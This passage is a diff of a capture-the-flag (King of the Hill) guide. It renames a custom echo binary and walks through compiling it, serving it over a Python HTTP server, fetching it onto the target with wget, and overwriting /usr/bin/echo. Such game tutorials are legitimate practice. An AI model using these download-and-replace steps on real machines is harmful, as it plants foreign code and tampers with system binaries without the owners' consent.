@@ -23,24 +23,24 @@
   - now, we gotta compile it first (:<br />
 
      ```
-     gcc -o h00dy-echo h00dy-echo.c
+     gcc -o custom-echo custom-echo.c
      ```
 
   - give it executable permissions:<br />
      
      ```
-     chmod +x h00dy-echo
+     chmod +x custom-echo
      ```
      
   - Now transfer it to the machine, in which you wanna use it:<br />
 
      - [ ] start a python server in your machine `python3 -m http.server 80`
 
-     - [ ] on the koth machine, do `wget <your ip>/h00dy-echo; chmod +x h00dy-echo`
+     - [ ] on the koth machine, do `wget <your ip>/custom-echo; chmod +x custom-echo`
 
      - [ ] we are good to go... now let's change the echo on the machine with our custom-echo
           
-           * `cp h00dy-echo /usr/bin/echo`
+           * `cp custom-echo /usr/bin/echo`
 
      - [ ] but it'll still not work, because echo is a shell-built-in, means it doesn't require any external binary to work in linux<br />
             
